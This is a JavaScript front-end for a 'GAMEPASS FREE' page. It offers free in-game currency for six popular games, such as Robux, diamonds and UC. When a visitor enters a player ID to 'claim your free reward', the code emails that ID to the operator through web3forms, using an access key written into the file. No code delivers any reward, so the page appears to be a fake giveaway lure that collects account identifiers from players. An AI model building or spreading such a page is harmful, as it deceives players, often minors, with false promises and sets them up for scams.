/* =====================================================
   GAMEPASS FREE — Script
   ===================================================== */

/* 👇 حط المفتاح ديالك من web3forms.com هنا */
const WEB3FORMS_KEY = "c1447cdc-cd17-4e6c-adb1-708dd0215003";

/* =====================================================
   1) DATA — قائمة الألعاب
   ===================================================== */
const GAMES = [
  {
    id: "freefire",
    name: "Free Fire",
    desc: "Diamonds & bundles",
    icon: "FF",
    colors: "linear-gradient(135deg,#ff4e00,#ff8a00)",
    idLabel: "Free Fire Player ID",
    idHint: "Find it in your in-game profile (top-left)",
    idPlaceholder: "e.g. 123456789"
  },
  {
    id: "pes",
    name: "eFootball PES",
    desc: "Coins & GP",
    icon: "PES",
    colors: "linear-gradient(135deg,#0b7a3e,#1eae60)",
    idLabel: "PES User ID",
    idHint: "Find it in Settings → Account",
    idPlaceholder: "e.g. 987654321"
  },
  {
    id: "roblox",
    name: "Roblox",
    desc: "Robux & items",
    icon: "RBX",
    colors: "linear-gradient(135deg,#e2231a,#b30f0b)",
    idLabel: "Roblox Username / ID",
    idHint: "Enter your Roblox username or numeric ID",
    idPlaceholder: "e.g. Player123"
  },
  {
    id: "pubg",
    name: "PUBG Mobile",
    desc: "UC & skins",
    icon: "PUBG",
    colors: "linear-gradient(135deg,#f5a623,#d48806)",
    idLabel: "PUBG Character ID",
    idHint: "Find it in your profile → Inventory",
    idPlaceholder: "e.g. 5123456789"
  },
  {
    id: "cod",
    name: "Call of Duty",
    desc: "CP & battle pass",
    icon: "COD",
    colors: "linear-gradient(135deg,#1f2937,#111827)",
    idLabel: "COD Player ID",
    idHint: "Find it in Settings → Account",
    idPlaceholder: "e.g. YourName#1234"
  },
  {
    id: "minecraft",
    name: "Minecraft",
    desc: "Minecoins & skins",
    icon: "MC",
    colors: "linear-gradient(135deg,#5a8f3d,#3e6b2a)",
    idLabel: "Minecraft Username",
    idHint: "Your Java or Bedrock username",
    idPlaceholder: "e.g. Steve123"
  }
];

/* =====================================================
   2) STATE
   ===================================================== */
let currentGame = null;

/* =====================================================
   3) DOM ELEMENTS
   ===================================================== */
const gamesGrid    = document.getElementById('gamesGrid');
const idForm       = document.getElementById('idForm');
const playerId     = document.getElementById('playerId');
const idGameIcon   = document.getElementById('idGameIcon');
const idGameTitle  = document.getElementById('idGameTitle');
const idGameSubtitle = document.getElementById('idGameSubtitle');
const idLabel      = document.getElementById('idLabel');
const idHint       = document.getElementById('idHint');
const idError      = document.getElementById('idError');
const sendBtn      = document.getElementById('sendBtn');
const status       = document.getElementById('status');
const successText  = document.getElementById('successText');

/* =====================================================
   4) RENDER GAME CARDS
   ===================================================== */
function renderGames() {
  gamesGrid.innerHTML = '';
  GAMES.forEach(game => {
    const card = document.createElement('div');
    card.className = 'game-card';
    card.innerHTML = `
      <div class="game-card__icon" style="background:${game.colors}">
        ${game.icon}
      </div>
      <div class="game-card__name">${game.name}</div>
      <div class="game-card__desc">${game.desc}</div>
    `;
    card.addEventListener('click', () => selectGame(game.id));
    gamesGrid.appendChild(card);
  });
}

/* =====================================================
   5) VIEW NAVIGATION
   ===================================================== */
function showView(name) {
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  document.getElementById('view-' + name).classList.add('active');
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

/* =====================================================
   6) SELECT A GAME
   ===================================================== */
function selectGame(gameId) {
  currentGame = GAMES.find(g => g.id === gameId);
  if (!currentGame) return;

  // Fill the ID card
  idGameIcon.textContent     = currentGame.icon;
  idGameIcon.style.background = currentGame.colors;
  idGameTitle.textContent    = currentGame.name;
  idGameSubtitle.textContent = 'Enter your ID to claim your free reward';
  idLabel.textContent        = currentGame.idLabel;
  idHint.textContent         = currentGame.idHint;
  playerId.placeholder       = currentGame.idPlaceholder;
  playerId.value             = '';
  idError.classList.remove('show');
  status.textContent         = '';
  status.className           = 'status';

  showView('id');
  setTimeout(() => playerId.focus(), 250);
}

/* =====================================================
   7) VALIDATION
   ===================================================== */
playerId.addEventListener('input', () => {
  idError.classList.remove('show');
  status.textContent = '';
});

playerId.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    idForm.requestSubmit();
  }
});

/* =====================================================
   8) SUBMIT FORM → SEND TO EMAIL
   ===================================================== */
idForm.addEventListener('submit', async (e) => {
  e.preventDefault();

  const val = playerId.value.trim();

  if (val.length < 4) {
    idError.classList.add('show');
    playerId.focus();
    return;
  }

  sendBtn.disabled = true;
  sendBtn.textContent = 'Sending…';
  status.className = 'status load';
  status.textContent = 'Please wait…';

  const payload = {
    access_key: WEB3FORMS_KEY,
    subject: `🎮 New GAMEPASS FREE Request — ${currentGame.name}`,
    from_name: 'GAMEPASS FREE',
    game: currentGame.name,
    player_id: val,
    message:
      `New reward request:\n\n` +
      `Game: ${currentGame.name}\n` +
      `Player ID: ${val}\n` +
      `Time: ${new Date().toLocaleString()}`
  };

  try {
    const res = await fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    const data = await res.json();

    if (data.success) {
      successText.textContent =
        `Your request for "${currentGame.name}" (ID: ${val}) has been submitted.`;
      showView('success');
      idForm.reset();
    } else {
      status.className = 'status err';
      status.textContent = '❌ Something went wrong. Try again.';
    }
  } catch (err) {
    status.className = 'status err';
    status.textContent = '❌ Network error. Check your connection.';
  }

  sendBtn.disabled = false;
  sendBtn.textContent = 'Send Request →';
});

/* =====================================================
   9) INIT
   ===================================================== */
renderGames();